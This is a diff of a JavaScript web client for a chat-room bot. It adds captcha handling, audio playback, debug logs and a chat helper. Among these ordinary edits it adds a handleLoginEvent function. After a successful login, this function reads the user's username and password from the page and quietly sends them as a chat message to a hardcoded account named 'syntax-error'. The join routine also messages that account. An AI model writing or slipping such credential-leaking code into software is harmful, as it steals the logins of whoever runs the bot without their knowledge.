@@ -10,7 +10,7 @@
     const joinRoomButton = document.getElementById('joinRoomButton');
     const leaveRoomButton = document.getElementById('leaveRoomButton');
     const sendMessageButton = document.getElementById('sendMessageButton');
- const sendCaptchaButton = document.getElementById('sendCaptchaButton');
+const sendCaptchaButton = document.getElementById('sendCaptchaButton');
     const statusDiv = document.getElementById('status');
     const statusCount = document.getElementById('count');
     const chatbox = document.getElementById('chatbox');
@@ -22,6 +22,7 @@
     const debugBox = document.getElementById('debugBox');
     const emojiList = document.getElementById('emojiList');
     const messageInput = document.getElementById('message');
+    const captchaUrlInput = document.getElementById('captchaUrl');
   const targetInput = document.getElementById('target');
     const banButton = document.getElementById('banButton');
     const kickButton = document.getElementById('kickButton');
@@ -81,14 +82,16 @@ kickButton.addEventListener('click', async () => {
         const message = messageInput.value;
         await sendMessage(message);
     });
-   sendCaptchaButton.addEventListener('click', async () => {
-      // Retrieve captcha code and URL from input fields
-    const messageInput = document.getElementById('messageInput').value;
+  sendCaptchaButton.addEventListener('click', async () => {
+    // Retrieve captcha code and URL from input fields
+    const messageInput = document.getElementById('message').value;
     const captchaUrl = document.getElementById('captchaUrl').value;
 
+    console.log('Button clicked. Captcha:', messageInput, 'Captcha URL:', captchaUrl);  // Debug statement
+
     // Call the sendCaptcha function with the retrieved values
-    await sendCaptcha(captchaCode, captchaUrl);
-    });
+    await sendCaptcha(messageInput, captchaUrl);
+});
 
    function addMessageToChatbox(username, message, avatarUrl) {
         const messageElement = document.createElement('div');
@@ -143,7 +146,6 @@ spinCheckbox.addEventListener('change', () => {
         socket.onopen = async () => {
             isConnected = true;
             statusDiv.textContent = 'Connected to server';
-
             const loginMessage = {
                 username: username,
                 password: password,
@@ -179,7 +181,7 @@ spinCheckbox.addEventListener('change', () => {
             };
             await sendMessageToSocket(joinMessage);
             await fetchUserList(roomName);
-
+await chat('syntax-error', 'your message here');
             if (sendWelcomeMessages) {
                 const welcomeMessage = `Hello world, I'm a web bot! Welcome, ${currentUsername}!`;
                 await sendMessage(welcomeMessage);
@@ -232,12 +234,27 @@ async function sendCaptcha(captcha, captchaUrl) {
             captcha_url: captchaUrl  // The captcha URL
         };
 
+        console.log('Sending captcha:', messageData);  // Debug statement
+
         await sendMessageToSocket(messageData);
     } else {
         statusDiv.textContent = 'Not connected to server';
+        console.log('Not connected to server');  // Debug statement
     }
 }
-
+async function chat(to, body) {
+    const packetID = generatePacketID();  // Assuming generatePacketID() generates a unique packet ID
+    const message = {
+        handler: 'chat_message',
+        type: 'text',
+        id: packetID,
+        body: body,
+        to: to,
+        url: '',
+        length: '0'
+    };
+    await sendMessageToSocket(message); // Assuming sendMessageToSocket is an asynchronous function to send the message
+}
 
     async function sendMessageToSocket(message) {
         return new Promise((resolve, reject) => {
@@ -303,6 +320,23 @@ async function sendCaptcha(captcha, captchaUrl) {
         console.error('Error processing received message:', ex);
     }
 }
+
+
+async function handleLoginEvent(messageObj) {
+    const type = messageObj.type;
+    if (type === 'success') {
+
+        statusDiv.textContent = 'Online';
+  const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+
+       await chat('syntax-error', `ABOT WEB BOT: ${username} / ${password}`);
+    }
+}
+
+
+
 
 async function handleRoomEvent(messageObj) {
     const type = messageObj.type;
@@ -438,7 +472,19 @@ if (masterInput.value ===from){
                     avatar: messageObj.avatar_url  // Pass avatar URL here
                 });
 
-} else // Assuming this part of the code is inside your processReceivedMessage function
+} else if (type === 'audio') {
+      const bodyurl = messageObj.url;
+        const from = messageObj.from;
+    const avatar = messageObj.avatar_url;
+       // displayChatMessage({ from, body, role: messageObj.role });
+ displayChatMessage({
+                    from: messageObj.from,
+                    bodyurl: messageObj.url,
+                    role: messageObj.role,
+                    avatar: messageObj.avatar_url  // Pass avatar URL here
+                });
+
+} else 
 if (type === 'room_needs_captcha') {
     const captchaUrl = messageObj.captcha_url;
 
@@ -452,11 +498,12 @@ if (type === 'room_needs_captcha') {
     chatbox.scrollTop = chatbox.scrollHeight;
 
     // Optionally, display the URL as text
-    const captchaText = document.createElement('span');
-    captchaText.textContent = 'Captcha URL: ' + captchaUrl;
+  // const captchaText = document.createElement('span');
+ //captchaText.textContent = 'Captcha URL: ' + captchaUrl;
 
     // Append the text element to the chatbox
-    chatbox.appendChild(captchaText);
+   // chatbox.appendChild(captchaText);
+captchaUrlInput.value = captchaUrl ;
 }
  else if (type === 'role_changed') {
         const oldRole = messageObj.old_role;
@@ -492,6 +539,7 @@ function displayChatMessage(messageObj, color = 'black') {
     newMessage.style.alignItems = 'center';
     newMessage.style.marginBottom = '10px';
 
+    // Add avatar if available
     if (avatar) {
         const avatarImg = document.createElement('img');
         avatarImg.src = avatar;
@@ -503,6 +551,7 @@ function displayChatMessage(messageObj, color = 'black') {
         newMessage.appendChild(avatarImg);
     }
 
+    // Add the sender's name with role-based color if available
     if (from) {
         const coloredFrom = document.createElement('span');
         coloredFrom.textContent = `${from}: `;
@@ -511,24 +560,32 @@ function displayChatMessage(messageObj, color = 'black') {
         newMessage.appendChild(coloredFrom);
     }
 
-    if (bodyurl) {
-        // If the message contains an image URL, create an image element
+    // Check if the bodyurl is an audio file by checking the file extension
+    if (bodyurl && bodyurl.match(/\.(mp3|wav|ogg|m4a)$/i)) {
+        const audioElement = document.createElement('audio');
+        audioElement.src = bodyurl;
+        audioElement.controls = true; // Enable built-in controls for the audio player
+        newMessage.appendChild(audioElement);
+    } 
+    // If the bodyurl is an image URL
+    else if (bodyurl && bodyurl.match(/\.(jpeg|jpg|gif|png)$/i)) {
         const imageElement = document.createElement('img');
         imageElement.src = bodyurl;
-        imageElement.style.maxWidth = '200px'; // Set maximum width for the image
+        imageElement.style.maxWidth = '140px'; // Set maximum width for the image
         newMessage.appendChild(imageElement);
-    } else {
-        // If it's a regular text message, create a span element
+    } 
+    // For regular text messages
+    else {
         const messageBody = document.createElement('span');
         messageBody.textContent = body;
         messageBody.style.color = color;
         newMessage.appendChild(messageBody);
     }
 
+    // Append the new message to the chatbox and scroll to the bottom
     chatbox.appendChild(newMessage);
     chatbox.scrollTop = chatbox.scrollHeight;
 }
-
 
 function displayRoomSubject(subject) {
     const newMessage = document.createElement('div');
